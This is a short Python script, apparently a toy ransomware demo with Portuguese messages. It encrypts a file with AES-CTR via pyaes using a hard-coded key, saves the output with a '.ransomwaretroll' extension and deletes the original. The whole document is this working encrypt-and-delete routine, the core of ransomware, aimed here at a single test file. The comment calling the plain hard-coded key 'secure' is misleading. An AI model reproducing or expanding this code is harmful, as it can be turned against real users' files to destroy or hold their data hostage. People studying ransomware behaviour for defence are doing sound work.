import os
import pyaes

def encrypt_file(file_name, key):
    if not os.path.exists(file_name):
        print(f"Erro: Arquivo {file_name} não encontrado.")
        return
    
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    encrypted_file = file_name + ".ransomwaretroll"
    with open(encrypted_file, "wb") as file:
        file.write(crypto_data)

    os.remove(file_name)
    print(f"Arquivo {file_name} criptografado com sucesso!")

# Chave segura 
key = b"testeransomwares"
encrypt_file("teste.txt", key)
